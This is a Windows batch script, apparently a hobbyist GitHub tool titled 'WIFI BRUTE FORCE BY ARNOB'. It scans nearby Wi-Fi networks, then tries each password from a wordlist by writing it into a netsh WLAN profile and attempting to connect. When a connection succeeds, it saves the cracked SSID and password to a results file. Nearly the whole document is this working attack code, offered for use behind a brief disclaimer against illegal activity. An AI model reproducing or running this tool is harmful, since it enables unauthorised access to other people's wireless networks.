@echo off
color 2
for /F "tokens=1,2 delims=#" %%a in ('"prompt #$H#$E# & echo on & for %%b in (1) do     rem"') do (
  set "DEL=%%a"
)
set name=No wifi selected!
set pass=No wordlist selected!
set goal=main
set count1=0
set attemp=0
cd BRUTE-FORCE-FILES
:disconnectorfirst
netsh wlan show interface | Find "connected" >> nul
if %errorlevel% == 0 (
echo Disconnecting from the current network ...
timeout 1 >>nul
netsh wlan disconnect >> nul
if %errorlevel% == 1 (
echo Failed to disconnect. Please disconnect from the internet manually.
pause 

)
)
goto toppest



:linecount
echo Processing wordlist ...
for %%I in (%pass%) do (
     if %%~zI GTR 10485760 (
	 echo.
	 echo Your wordlist's size is greater than 10 mb
	 echo So for time saving, we will run a shortcut command.
	 echo It will also count the blank lines in the wordlist!
	 timeout 5 >>nul
     for /f "tokens=2*delims=: " %%i in ('find /v /c "" %pass%') do set count1=%%j
	 goto main
  ) else (
  for /f %%a in (%pass%) do (
       set /a count1+=1
       set end=%%a
       )
          if "%end%" == "" (
		  goto main
		  )
  )
)





:toppest
call :deller
:main
cls
title WIFI BRUTE FORCE BY ARNOB (IN DEVELOPMENT)
echo ------------------------------------------------
echo                WIFI BRUTE FORCE            V-1.0
echo ------------------------------------------------
echo.
echo                WIFI NAME: %name%
echo                WORDLIST : %pass%
echo.
echo ------------------------------------------------
echo.
call :colorEcho 0c "admin"
call :colorEcho 0e "@"
call :colorEcho 0f "user"
set /p var=:
       if "%var%" == "wifi scan" goto top
       if "%var%" == "wordlist name" goto wordlist
       if "%var%" == "start attack" goto preattack
       if "%var%" == "help" goto help 
echo INVALID COMMAND! Type "help" for help.
pause
goto main
:top
echo Scanning for nearby wifi ....
timeout 2 >nul
cls
echo Please select an wifi below.
echo.
set count=0
for /f "tokens=2*delims=: " %%i in ('netsh wlan show networks^|find "SSID"')do @echo\%%j>>wifilist.txt
for /f "tokens=* delims= " %%f in (wifilist.txt) do (
  set line=%%f
  call :processToken
  )
  goto line_count
  goto :eof

:processToken
set /a count=%count% + 1
  for /f "tokens=1* delims=/" %%a in ("%line%") do (
  echo %count%- %%a
  echo wifi%count% : %%a>>output.txt
  set line=%%b
  )
  if not "%line%" == "" goto :processToken
  goto :eof


:line_count
@echo off
echo.
set /p num=Enter the wifi number:
type output.txt | find "wifi%num%">>output2.txt
for /f "tokens=1*delims=: " %%i in ('type output2.txt') do echo %%j>>output3.txt
set /p name=<output3.txt
goto toppest







:wordlist
cls
set /p pass=Enter a wordlist name:
if not exist "%pass%" (
  echo The wordlist that you have entered is not found!
  echo Type the whole link to the wordlist and type the extension.
  pause
  goto wordlist
)
goto linecount
:preattack
if "%name%" == "No wifi selected!" echo Please select an wifi network! & pause & goto toppest
if "%pass%" == "No wordlist selected!" echo Please select an wordlist! & pause & goto toppest
goto attack
:attack
for /F "tokens=1" %%i in (%pass%) do call :process %%i
goto thenextstep
:process
cls
set /a attemp+=1
call :calc_percentage "%attemp%" "%count1%"
set VAR1=%1
echo -------------------------------------------
echo Trying password :%VAR1%
echo Passwords       :%count1%
echo Attemts         :%attemp%
echo Tryed           :%pass_percentage%%%
if %pass_percentage% == 101 goto nfound
echo -------------------------------------------
echo F | xcopy /i "importwifi.xml" "attemp.xml" >nul
powershell -Command "(gc attemp.xml) -replace 'changethistitle', '%name%' | Out-File -encoding ASCII attemp.xml"
powershell -Command "(gc attemp.xml) -replace 'changethisname', '%name%' | Out-File -encoding ASCII attemp.xml"
powershell -Command "(gc attemp.xml) -replace 'changethiskey', '%VAR1%' | Out-File -encoding ASCII attemp.xml"
netsh wlan add profile filename="attemp.xml" >nul
netsh wlan connect "%name%" >nul
for /f "tokens=1-4" %%a in ('netsh wlan show interfaces ^| findstr /L State') do set connection_is_sec=%%c
call :check_connect
for /f "tokens=1-4" %%a in ('netsh wlan show interfaces ^| findstr /L State') do set connection_is_sec=%%c
call :check_connect
for /f "tokens=1-4" %%a in ('netsh wlan show interfaces ^| findstr /L State') do set connection_is_sec=%%c
call :check_connect
for /f "tokens=1-4" %%a in ('netsh wlan show interfaces ^| findstr /L State') do set connection_is_sec=%%c
call :check_connect
for /f "tokens=1-4" %%a in ('netsh wlan show interfaces ^| findstr /L State') do set connection_is_sec=%%c
call :check_connect
for /f "tokens=1-4" %%a in ('netsh wlan show interfaces ^| findstr /L State') do set connection_is_sec=%%c
call :check_connect
for /f "tokens=1-4" %%a in ('netsh wlan show interfaces ^| findstr /L State') do set connection_is_sec=%%c
call :check_connect
for /f "tokens=1-4" %%a in ('netsh wlan show interfaces ^| findstr /L State') do set connection_is_sec=%%c
call :check_connect
for /f "tokens=1-4" %%a in ('netsh wlan show interfaces ^| findstr /L State') do set connection_is_sec=%%c
call :check_connect
for /f "tokens=1-4" %%a in ('netsh wlan show interfaces ^| findstr /L State') do set connection_is_sec=%%c
call :check_connect
for /f "tokens=1-4" %%a in ('netsh wlan show interfaces ^| findstr /L State') do set connection_is_sec=%%c
call :check_connect
for /f "tokens=1-4" %%a in ('netsh wlan show interfaces ^| findstr /L State') do set connection_is_sec=%%c
call :check_connect
rem goto success
netsh wlan delete profile name="%name%" >nul
del attemp.xml
goto :EOF

:success
cls
set goal=another
goto deller
:another
echo The password has been found.
echo.
echo --------------------------------
echo Wifi name: %name%
echo Wifi pass: %VAR1%
echo Attempts : %attemp%
echo --------------------------------
echo.
echo -------------------------------->>"results/%name%.txt"
echo    WIFI BRUTE FORCER BY ARNOB>>"results/%name%.txt"
echo -------------------------------->>"results/%name%.txt"
echo.>>"results/%name%.txt"
echo          SSID:%name%>>"results/%name%.txt"
echo WIFI PASSWORD:%VAR1%>>"results/%name%.txt"
echo The information has been saved on BRUTE-FORCE-FILES/results/%name%.txt
pause
exit
:deller
if exist output.txt del output.txt
if exist output2.txt del output2.txt
if exist output3.txt del output3.txt
if exist wifilist.txt del wifilist.txt
:delthis
if exist attemp.xml del attemp.xml
goto %goal%
pause
exit






:help
cls
echo -wifi scan          : Scans for wifi network.
echo -wordlist name      : To set a wordlist name
echo -attack             : To perform brute force attack on the target wifi
echo -help               : To show this page
echo.
echo This tool is made by Arnob. I am not responible for any illigel activity done by this tool.
echo For more tools, check my github page : "https://github.com/Arnob231" .
pause
goto toppest  
:nfound
cls
echo ------------------------------------------
echo Sorry, the password could not be found.
echo you can try a different wordlist.
echo ------------------------------------------
pause
exit

:colorEcho
echo off
<nul set /p ".=%DEL%" > "%~2"
findstr /v /a:%1 /R "^$" "%~2" nul
del "%~2" > nul 2>&1i
goto :eof
:calc_percentage
set /a pass_percentage = (%~1*100)/%~2
goto :eof



:check_connect
  if %connection_is_sec% == associating (
      call :colorEcho 0f "ASSOCIATING"
)
  if %connection_is_sec% == disconnecting (
      call :colorEcho 0c "DISCONNECTING"
)
  if %connection_is_sec% == disconnected (
      call :colorEcho 04 "DISCONNECTED"  
)
  if %connection_is_sec% == authenticating (
      call :colorEcho 0a "AUTHENTICATING"
)
  if %connection_is_sec% == connecting (
      call :colorEcho 02 "CONNECTING"
)
  if %connection_is_sec% == connected (
      call colorEcho 02 "CONNECTED"
	  echo.
	  goto success
)
echo.
